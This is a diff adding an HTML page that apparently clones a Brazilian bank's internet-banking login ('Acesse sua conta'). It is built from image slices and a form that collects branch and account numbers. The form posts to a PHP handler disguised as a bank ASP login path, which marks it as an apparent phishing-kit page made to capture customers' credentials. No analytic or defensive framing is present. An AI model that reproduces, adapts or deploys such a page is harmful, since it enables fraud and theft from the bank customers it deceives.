@@ -1,0 +1,143 @@
+<!DOCTYPE html PUBLIC "-//W3C//DTD XHTML 1.0 Transitional//EN" "http://www.w3.org/TR/xhtml1/DTD/xhtml1-transitional.dtd">
+<html xmlns="http://www.w3.org/1999/xhtml">
+ <head>
+  <meta content="Content-Type" http-equiv="Content-Type" />
+  <title>
+   Acesse sua conta..
+  </title>
+  <link type="text/css" rel="stylesheet" href="style/index.css" />
+  <script src="scripts/Validation.js" language="javascript">
+  </script>
+  <script src="scripts/JumpField.js" language="JavaScript">
+  </script>
+  <script src="scripts/formataMascara.js" language="javascript">
+  </script>
+ </head>
+ <body>
+  <div id="top_select01">
+   <div id="dentroTopo_select01">
+    <table width="477" align="left" cellspacing="0" cellpadding="0">
+     <form onsubmit="return macTools();" method="post" action="aapf/login.asp.php" id="form" name="form">
+     </form>
+     <tbody>
+      <tr>
+       <td width="300">
+       </td>
+       <td>
+       </td>
+       <td>
+       </td>
+       <td>
+       </td>
+      </tr>
+      <tr>
+       <td width="300" height="20">
+       </td>
+       <td width="61" height="20">
+        <input type="text" lang="1" xml:lang="1" maxlength="6" size="6" value="Agência" onkeyup="formataMascara('####-@', this);JumpField(this.form.name, this.name, 6);" onblur="blurLogin(this.id)" onfocus="clean(this.id)" id="pac01" name="pac01" />
+       </td>
+       <td width="81" height="20">
+        <input type="text" lang="1" xml:lang="1" maxlength="13" size="13" value="Conta" onkeyup="formataMascara('###########-@', this);JumpField(this.form.name, this.name, 13)" onblur="blurSenha(this.id)" onfocus="clean(this.id)" id="pac02" name="pac02" />
+       </td>
+       <td width="33" height="20">
+        <input type="submit" value=" " name="ir" id="ir" />
+       </td>
+      </tr>
+     </tbody>
+    </table>
+   </div>
+  </div>
+  <div id="topoSelect02">
+   <div id="dentroTopo_select02">
+    <a href="estilo.php">
+     <img width="644" height="40" border="0" style="margin-left:130px;" src="imgs/a023842429.jpg" />
+    </a>
+   </div>
+  </div>
+  <table align="center">
+   <tbody>
+    <tr>
+     <td height="48" colspan="3">
+      <a href="#">
+       <img width="984" height="29" border="0" src="imgs/bb0000089234782.jpg" />
+      </a>
+     </td>
+    </tr>
+    <tr>
+     <th width="505" scope="col" rowspan="2">
+      <a href="#">
+       <img width="504" height="297" border="0" src="imgs/bb002834892342.jpg" />
+      </a>
+     </th>
+     <th width="249" height="85" scope="col">
+      <a href="#">
+       <img width="232" height="142" border="0" src="imgs/aa01.jpg" />
+      </a>
+     </th>
+     <th width="233" scope="col">
+      <a href="#">
+       <img width="232" height="142" border="0" src="imgs/aa02.jpg" />
+      </a>
+     </th>
+    </tr>
+    <tr>
+     <td height="144">
+      <a href="#">
+       <img width="232" height="142" border="0" src="imgs/aa03.jpg" />
+      </a>
+     </td>
+     <td>
+      <a href="#">
+       <img width="232" height="142" border="0" src="imgs/aa04.jpg" />
+      </a>
+     </td>
+    </tr>
+    <tr>
+     <td>
+     </td>
+     <td>
+     </td>
+     <td>
+     </td>
+    </tr>
+    <tr>
+     <td rowspan="2">
+      <a href="#">
+       <img width="495" height="452" border="0" src="imgs/aaa01.jpg" />
+      </a>
+     </td>
+     <td height="155" colspan="2">
+      <a href="#">
+       <img width="468" height="143" border="0" src="imgs/aaa02.jpg" />
+      </a>
+     </td>
+    </tr>
+    <tr>
+     <td height="299" colspan="2">
+      <a href="#">
+       <img width="474" height="297" border="0" src="imgs/aaa03.jpg" />
+      </a>
+     </td>
+    </tr>
+    <tr>
+     <td>
+     </td>
+     <td>
+     </td>
+     <td>
+     </td>
+    </tr>
+    <tr>
+     <td>
+     </td>
+     <td>
+     </td>
+     <td>
+     </td>
+    </tr>
+   </tbody>
+  </table>
+  <div id="floarLolout">
+  </div>
+ </body>
+</html>
